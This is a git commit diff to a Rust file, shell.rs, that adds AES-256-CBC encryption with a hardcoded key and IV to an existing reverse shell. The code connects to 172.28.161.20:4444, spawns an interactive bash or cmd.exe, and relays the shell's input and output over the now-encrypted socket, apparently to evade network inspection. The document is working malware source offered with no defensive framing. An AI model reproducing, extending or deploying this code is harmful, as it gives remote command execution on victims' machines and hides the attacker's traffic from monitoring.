abe1b3020b91a9d90433798ae7dfa586277a703a
Kaioken <raygsm@live.fr>
2025-06-19 11:02:04 +0200

    ajout chiffrement aes

--- src/shell.rs
+++ src/shell.rs
@@ -1,32 +1,74 @@
 use std::net::TcpStream;
 use std::process::{Command, Stdio};
-use std::io;
+use std::io::{self, Read, Write};
 
-#[cfg(unix)]
-use std::os::unix::io::{AsRawFd, FromRawFd};
+use aes::cipher::{
+    BlockDecryptMut, BlockEncryptMut, KeyIvInit,
+    block_padding::Pkcs7
+};
+use cbc::{Decryptor, Encryptor};
 
-pub async fn launch_shell() -> io::Result<()> {
-    let sock = TcpStream::connect("172.28.161.20:4444").unwrap();
+type Aes256CbcEnc = Encryptor<aes::Aes256>;
+type Aes256CbcDec = Decryptor<aes::Aes256>;
 
-    #[cfg(unix)]
-    {
-        let fd = sock.as_raw_fd();
-        Command::new("/bin/bash")
-            .arg("-i")
-            .stdin(unsafe { Stdio::from_raw_fd(fd) })
-            .stdout(unsafe { Stdio::from_raw_fd(fd) })
-            .stderr(unsafe { Stdio::from_raw_fd(fd) })
-            .spawn()?
-            .wait()?;
+const KEY: &[u8; 32] = b"initsecurekey1234567890ABCDEFGHI";
+const IV: &[u8; 16] = b"initvector123456";
+
+pub struct EncryptedStream {
+    stream: TcpStream,
+}
+
+impl EncryptedStream {
+    pub fn new(stream: TcpStream) -> Self {
+        Self { stream }
+    }
+
+    pub fn encrypt_and_send(&mut self, data: &[u8]) -> io::Result<()> {
+
+        let block_size = 16;
+        let padding_needed = block_size - (data.len() % block_size);
+        let padded_len = data.len() + padding_needed;
+        
+        let mut buffer = vec![0u8; padded_len];
+        buffer[..data.len()].copy_from_slice(data);
+        
+        let cipher = Aes256CbcEnc::new(KEY.into(), IV.into());
+        let ciphertext = cipher.encrypt_padded_mut::<Pkcs7>(&mut buffer, data.len())
+            .map_err(|_| io::Error::new(io::ErrorKind::Other, "Encryption failed"))?;
+        
+        let len = (ciphertext.len() as u16).to_be_bytes();
+        self.stream.write_all(&len)?;
+        self.stream.write_all(ciphertext)?;
+        self.stream.flush()?;
+        
         Ok(())
     }
 
-    #[cfg(windows)]
+    pub fn receive_and_decrypt(&mut self) -> io::Result<Vec<u8>> {
+        let mut len_buf = [0u8; 2];
+        self.stream.read_exact(&mut len_buf)?;
+        let len = u16::from_be_bytes(len_buf) as usize;
+        
+        let mut buf = vec![0u8; len];
+        self.stream.read_exact(&mut buf)?;
+        
+        let cipher = Aes256CbcDec::new(KEY.into(), IV.into());
+        match cipher.decrypt_padded_mut::<Pkcs7>(&mut buf) {
+            Ok(plaintext) => Ok(plaintext.to_vec()),
+            Err(_) => Err(io::Error::new(io::ErrorKind::InvalidData, "Decryption failed"))
+        }
+    }
+}
+
+pub async fn launch_shell() -> io::Result<()> {
+    let sock = TcpStream::connect("172.28.161.20:4444")?;
+
+    #[cfg(unix)]
     {
-        use std::io::{Read, Write};
         use std::thread;
 
-        let mut child = Command::new("cmd.exe")
+        let mut child = Command::new("/bin/bash")
+            .arg("-i")
             .stdin(Stdio::piped())
             .stdout(Stdio::piped())
             .stderr(Stdio::piped())
@@ -36,17 +78,15 @@ pub async fn launch_shell() -> io::Result<()> {
         let mut child_stderr = child.stderr.take().unwrap();
         let mut child_stdin = child.stdin.take().unwrap();
 
-        let mut sock_read = sock.try_clone().unwrap();
-        let mut sock_write1 = sock.try_clone().unwrap();
-        let mut sock_write2 = sock.try_clone().unwrap();
+        let mut encrypted_read = EncryptedStream::new(sock.try_clone()?);
+        let mut encrypted_write1 = EncryptedStream::new(sock.try_clone()?);
+        let mut encrypted_write2 = EncryptedStream::new(sock.try_clone()?);
 
         let stdin_thread = thread::spawn(move || {
-            let mut buffer = [0u8; 1024];
             loop {
-                match sock_read.read(&mut buffer) {
-                    Ok(0) => break,
-                    Ok(n) => {
-                        if child_stdin.write_all(&buffer[..n]).is_err() {
+                match encrypted_read.receive_and_decrypt() {
+                    Ok(data) => {
+                        if child_stdin.write_all(&data).is_err() {
                             break;
                         }
                         child_stdin.flush().ok();
@@ -62,7 +102,7 @@ pub async fn launch_shell() -> io::Result<()> {
                 match child_stdout.read(&mut buffer) {
                     Ok(0) => break,
                     Ok(n) => {
-                        if sock_write1.write_all(&buffer[..n]).is_err() {
+                        if encrypted_write1.encrypt_and_send(&buffer[..n]).is_err() {
                             break;
                         }
                     }
@@ -77,7 +117,77 @@ pub async fn launch_shell() -> io::Result<()> {
                 match child_stderr.read(&mut buffer) {
                     Ok(0) => break,
                     Ok(n) => {
-                        if sock_write2.write_all(&buffer[..n]).is_err() {
+                        if encrypted_write2.encrypt_and_send(&buffer[..n]).is_err() {
+                            break;
+                        }
+                    }
+                    Err(_) => break,
+                }
+            }
+        });
+
+        child.wait()?;
+        stdin_thread.join().ok();
+        stdout_thread.join().ok();
+        stderr_thread.join().ok();
+
+        Ok(())
+    }
+
+    #[cfg(windows)]
+    {
+        use std::thread;
+
+        let mut child = Command::new("cmd.exe")
+            .stdin(Stdio::piped())
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()?;
+
+        let mut child_stdout = child.stdout.take().unwrap();
+        let mut child_stderr = child.stderr.take().unwrap();
+        let mut child_stdin = child.stdin.take().unwrap();
+
+        let mut encrypted_read = EncryptedStream::new(sock.try_clone()?);
+        let mut encrypted_write1 = EncryptedStream::new(sock.try_clone()?);
+        let mut encrypted_write2 = EncryptedStream::new(sock.try_clone()?);
+
+        let stdin_thread = thread::spawn(move || {
+            loop {
+                match encrypted_read.receive_and_decrypt() {
+                    Ok(data) => {
+                        if child_stdin.write_all(&data).is_err() {
+                            break;
+                        }
+                        child_stdin.flush().ok();
+                    }
+                    Err(_) => break,
+                }
+            }
+        });
+
+        let stdout_thread = thread::spawn(move || {
+            let mut buffer = [0u8; 1024];
+            loop {
+                match child_stdout.read(&mut buffer) {
+                    Ok(0) => break,
+                    Ok(n) => {
+                        if encrypted_write1.encrypt_and_send(&buffer[..n]).is_err() {
+                            break;
+                        }
+                    }
+                    Err(_) => break,
+                }
+            }
+        });
+
+        let stderr_thread = thread::spawn(move || {
+            let mut buffer = [0u8; 1024];
+            loop {
+                match child_stderr.read(&mut buffer) {
+                    Ok(0) => break,
+                    Ok(n) => {
+                        if encrypted_write2.encrypt_and_send(&buffer[..n]).is_err() {
                             break;
                         }
                     }
